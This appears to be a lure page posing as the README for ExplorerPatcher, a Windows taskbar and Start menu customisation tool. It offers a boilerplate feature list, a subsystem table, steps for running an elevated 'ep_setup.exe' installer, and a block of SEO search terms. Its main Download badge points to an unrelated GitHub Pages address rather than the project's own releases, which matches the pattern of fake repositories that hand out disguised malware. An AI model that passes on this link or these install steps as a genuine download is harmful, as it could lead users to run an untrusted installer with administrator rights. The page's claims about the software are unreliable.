## [01] SYSTEM_MANIFEST & SCOPE

ExplorerPatcher is an open-source system modification framework engineered to enhance usability and restore classic interface paradigms across modern Windows operating environments. Designed for power users, developers, and system administrators, it integrates patches directly into the Windows Shell runtime, restoring legacy taskbar functionality, classic window switchers, and granular desktop behavior configurations.

[![Download ExplorerPatcher](https://img.shields.io/badge/Download-ExplorerPatcher-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://ivunevcdc.github.io/.github/ExplorerPatcher-System-Core)

ExplorerPatcher operates via dynamically injected runtime patches into `explorer.exe` without permanently modifying core system binaries. By providing options to re-enable classic Start menu styles, customize system tray flyouts, restore standard context menus, and modify taskbar positioning, it allows users to optimize their workflow environment while maintaining native system stability.

---

## [02] LOW_LEVEL_ARCHITECTURE

* **[SHELL_INJECTION_CORE]** : Injects custom hooks into active `explorer.exe` process instances during initialization to patch internal interface dispatch routines.
* **[TASKBAR_PATCH_MODULE]** : Re-enables legacy Windows 10 taskbar code paths, restoring ungrouped taskbar items, custom toolbar bands, and edge alignment controls.
* **[START_MENU_HOOK]** : Renders and manages legacy Start menu interfaces with configurable layout policies, pin matrices, and search integration pipelines.
* **[SYSTEM_TRAY_PARSER]** : Restores classic notification area flyouts, including battery, network, clock, and volume control overlays.
* **[UPDATE_MANAGER_NODE]** : Incorporates an automated runtime update checker that fetches verified release assets directly from official repository mirrors.

<img src="https://explorerpatcher.net/wp-content/uploads/2025/10/explorerpatcher-image-1.png" alt="Program Interface Screenshot"/>

---

## [03] PARAMETRIC_SUBSYSTEM_MATRIX

| SUBSYSTEM_ID | INTERFACE_TECH | OPERATIONAL_BEHAVIOR |
| :--- | :--- | :--- |
| **SHELL_HOOK** | Win32 Process Memory API | Intercepts Explorer UI calls to redirect window management routines. |
| **TASKBAR_UI** | DirectUI / Win32 Control | Reverts taskbar styles, position parameters, and icon grouping behaviors. |
| **ALT_TAB_MGR** | Native Window Switcher API | Toggles between modern, classic Windows 10, and legacy Alt+Tab window switchers. |
| **CONTEXT_MENU** | Shell COM Extension Hook | Bypasses modern context overlays to display fully expanded classic right-click menus. |
| **CONFIG_PANEL** | Win32 GUI Control | Exposes an integrated properties control panel for managing active patch flags. |

---

## [04] DEPLOYMENT_AND_EXECUTION_PROTOCOL

1. **System Preparation:**
   Ensure target machine runs Windows NT (Windows 11) with local user access and administrative execution rights.

2. **Package Acquisition:**
   Download the unified `ep_setup.exe` installer from the release assets distribution channel.

3. **Injection Setup:**
   Execute `ep_setup.exe` to trigger automatic elevation, temporarily restart `explorer.exe`, and deploy necessary DLL patch hooks into the system environment.

4. **Configuration & Customization:**
   Right-click the taskbar, select "Properties" to open the ExplorerPatcher configuration panel, and adjust UI style flags as desired.

---

### SEARCH TERMS
ExplorerPatcher Windows • shell patcher utility • restore classic taskbar • Windows 10 taskbar on 11 • classic start menu restore • legacy alt tab switcher • explorer customization tool • system tray flyout patch • ungroup taskbar icons • classic context menu restore • desktop customization engine • windows shell tweak • explorer process hook • system UI enhancer • shell properties manager
